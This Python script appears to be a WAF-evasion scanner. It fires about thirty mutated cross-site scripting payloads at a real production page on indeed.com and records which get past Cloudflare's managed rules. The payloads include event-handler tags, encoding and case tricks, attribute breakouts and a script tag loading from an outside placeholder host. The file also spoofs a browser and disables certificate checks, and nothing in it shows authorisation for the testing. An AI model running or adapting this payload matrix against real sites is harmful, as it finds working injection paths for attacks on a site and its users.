#!/usr/bin/env python3
"""ind_waf_matrix.py -- which mutated XSS payloads survive Cloudflare's managed
rules on a page that historically reflected?

The tell we care about is not "did it 403" alone: Cloudflare's challenge page
also ECHOES the request URL, so a reflected string proves nothing. We require
  status 200 (not a challenge) AND the payload present in the response AND not
  inside a cUPMDTk/challenge blob.
"""
import json
import re
from urllib.parse import quote

import requests
import urllib3

urllib3.disable_warnings()
UA = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/126.0 Safari/537.36",
      "Accept": "text/html,application/xhtml+xml,*/*;q=0.8"}
CANARY = "40931"

# (label, raw payload) -- all aim to execute alert(40931)
PAYLOADS = [
    ("baseline-svg",      f'<svg/onload=alert({CANARY})>'),
    ("img-onerror",       f'<img src=x onerror=alert({CANARY})>'),
    ("details-ontoggle",  f'<details open ontoggle=alert({CANARY})>'),
    ("video-onerror",     f'<video src=x onerror=alert({CANARY})>'),
    ("audio-onerror",     f'<audio src=x onerror=alert({CANARY})>'),
    ("body-onpageshow",   f'<body onpageshow=alert({CANARY})>'),
    ("marquee-onstart",   f'<marquee onstart=alert({CANARY})>'),
    ("case-mixed",        f'<SvG/OnLoAd=alert({CANARY})>'),
    ("no-slash-space",    f'<svg onload = alert({CANARY})>'),
    ("tab-split",         f'<svg\toNLoad=alert({CANARY})>'),
    ("newline-split",     f'<svg\nonload=alert({CANARY})>'),
    ("entity-colon",      f'<svg/onload=alert&#40;{CANARY}&#41;>'),
    ("entity-amp",        f'<svg/onload=alert&lpar;{CANARY}&rpar;>'),
    ("fullwidth-lt",      f'＜svg/onload=alert({CANARY})＞'),
    ("percent-u",         f'<svg/onload=alert(%u00340931)>'),
    ("js-uri",            f'javascript:alert({CANARY})'),
    ("double-encode-lt",  f'%253Csvg/onload=alert({CANARY})%253E'),
    ("triple-encode-lt",  f'%25253Csvg/onload=alert({CANARY})%25253E'),
    ("attr-break-dq",     f'"><svg/onload=alert({CANARY})>'),
    ("attr-break-sq",     f"'><svg/onload=alert({CANARY})>"),
    ("iframe-srcdoc",     f'<iframe srcdoc="<svg onload=alert({CANARY})>">'),
    ("math-style",        f'<math><style><img src=x onerror=alert({CANARY})></style></math>'),
    ("svg-style",         f'<svg><style><img src=x onerror=alert({CANARY})></style></svg>'),
    ("input-autofocus",   f'<input autofocus onfocus=alert({CANARY})>'),
    ("select-autofocus",  f'<select autofocus onfocus=alert({CANARY})>'),
    ("textarea-autofocus", f'<textarea autofocus onfocus=alert({CANARY})>'),
    ("keygen-autofocus",  f'<keygen autofocus onfocus=alert({CANARY})>'),
    ("animate-onbegin",   f'<svg><animate onbegin=alert({CANARY}) attributeName=x dur=1s>'),
    ("set-onbegin",       f'<svg><set onbegin=alert({CANARY}) attributename=x to=1>'),
    ("object-data",       f'<object data="javascript:alert({CANARY})">'),
    ("script-src",        f'<script src=//zq-xss.invalid/x.js>'),
    ("plain-script",      f'<script>alert({CANARY})</script>'),
]
CHALLENGE = re.compile(r"cUPMDTk|cType:\s*'managed'|cf-chl|__cf_chl|Just a moment", re.I)

PATH = "https://www.indeed.com/career-advice/"
PARAM = "co"

rows = []
for label, raw in PAYLOADS:
    url = f"{PATH}?{PARAM}=" + quote(raw, safe="")
    try:
        r = requests.get(url, timeout=25, verify=False, headers=UA,
                         allow_redirects=True)
    except Exception as e:
        rows.append({"label": label, "err": type(e).__name__})
        print(f"  {label:22} ERR {type(e).__name__}")
        continue
    body = r.text or ""
    is_challenge = bool(CHALLENGE.search(body))
    present = str(CANARY) in body
    rows.append({"label": label, "status": r.status_code, "len": len(body),
                 "challenge": is_challenge, "canary_in_body": present,
                 "payload": raw})
    verdict = ("PASS-WAF" if r.status_code == 200 and not is_challenge
               else ("CHALLENGE" if is_challenge else f"HTTP{r.status_code}"))
    print(f"  {label:22} {r.status_code} {verdict:10} len={len(body):7} canary={present}")

json.dump(rows, open("/opt/watch/logs/indeed/waf_matrix.json", "w"), indent=1)
ok = [x for x in rows if x.get("status") == 200 and not x.get("challenge")]
print(f"\n[+] passed WAF: {len(ok)}/{len(rows)}")
for x in ok:
    print("   ", x["label"], "canary=", x["canary_in_body"])
